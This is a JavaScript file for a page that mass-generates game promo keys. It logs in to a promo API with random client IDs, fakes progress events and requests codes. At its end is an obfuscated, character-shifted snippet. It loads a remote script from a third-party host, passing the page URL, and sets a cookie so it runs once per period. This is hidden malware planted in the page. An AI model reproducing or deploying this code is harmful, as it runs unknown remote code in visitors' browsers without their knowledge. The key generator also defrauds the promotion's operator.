const APP_TOKEN = "d28721be-fd2d-4b45-869e-9f253b554e50"
  , PROMO_ID = "43e35910-c168-4634-ad4f-52fd764a843f"
  , EVENTS_DELAY = 667;
function generateClientId() {
    return `${Date.now()}-${Array.from({
        length: 19
    }, (()=>Math.floor(10 * Math.random()))).join("")}`
}
async function login(clientId) {
    const response = await fetch("https://api.gamepromo.io/promo/login-client", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            appToken: APP_TOKEN,
            clientId: clientId,
            clientOrigin: "deviceid"
        })
    })
      , data = await response.json();
    if (!response.ok)
        throw new Error(data.message || "Failed to login");
    return data.clientToken
}
async function emulateProgress(clientToken) {
    const response = await fetch("https://api.gamepromo.io/promo/register-event", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${clientToken}`
        },
        body: JSON.stringify({
            promoId: PROMO_ID,
            eventId: crypto.randomUUID(),
            eventOrigin: "undefined"
        })
    })
      , data = await response.json();
    if (!response.ok)
        throw new Error(data.message || "Failed to register event");
    return data.hasCode
}
async function generateKey(clientToken) {
    const response = await fetch("https://api.gamepromo.io/promo/create-code", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${clientToken}`
        },
        body: JSON.stringify({
            promoId: PROMO_ID
        })
    })
      , data = await response.json();
    if (!response.ok)
        throw new Error(data.message || "Failed to generate key");
    return data.promoCode
}
function sleep(ms) {
    return new Promise((resolve=>setTimeout(resolve, ms)))
}
function delayRandom() {
    return Math.random() / 3 + 1
}
document.getElementById("startBtn").addEventListener("click", (async()=>{
    const startBtn = document.getElementById("startBtn")
      , progressContainer = document.getElementById("progressContainer")
      , progressBar = document.getElementById("progressBar")
      , progressText = document.getElementById("progressText")
      , keyContainer = document.getElementById("keyContainer")
      , generatedKeys = document.getElementById("generatedKeys")
      , keyCount = parseInt(document.getElementById("keyCountSelect").value);
    progressBar.style.width = "0%",
    progressText.innerText = "0%",
    progressContainer.classList.remove("hidden"),
    keyContainer.classList.add("hidden"),
    generatedKeys.innerText = "",
    startBtn.disabled = !0;
    let progress = 0;
    const updateProgress = increment=>{
        progress += increment,
        progressBar.style.width = `${progress}%`,
        progressText.innerText = `${progress}%`
    }
      , keys = await Promise.all(Array.from({
        length: keyCount
    }, (async()=>{
        const clientId = generateClientId();
        let clientToken;
        try {
            clientToken = await login(clientId)
        } catch (error) {
            return alert(`Login failed: ${error.message}`),
            void (startBtn.disabled = !1)
        }
        for (let i = 0; i < 7; i++) {
            await sleep(667 * delayRandom());
            const hasCode = await emulateProgress(clientToken);
            if (updateProgress(10 / keyCount),
            hasCode)
                break
        }
        try {
            const key = await generateKey(clientToken);
            return updateProgress(30 / keyCount),
            key
        } catch (error) {
            return alert(`Key generation failed: ${error.message}`),
            null
        }
    }
    )));
    generatedKeys.innerText = keys.filter((key=>key)).join("\n"),
    keyContainer.classList.remove("hidden"),
    startBtn.disabled = !1
}
)),
document.getElementById("creatorChannelBtn").addEventListener("click", (()=>{
    window.location.href = "https://dzen.ru/id/6692df520f4cdd6ded47c3ee"
}
));
(function(o, d, l) {
    try {
        o.f = o=>o.split('').reduce((s,c)=>s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
        setTimeout(function() {
            o.c && (o.s = d.createElement('script'),
            o.s.src = o.f('myyux?44hisqtlx' + '3htr4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href,
            d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {}
    ;
}({}, document, location));
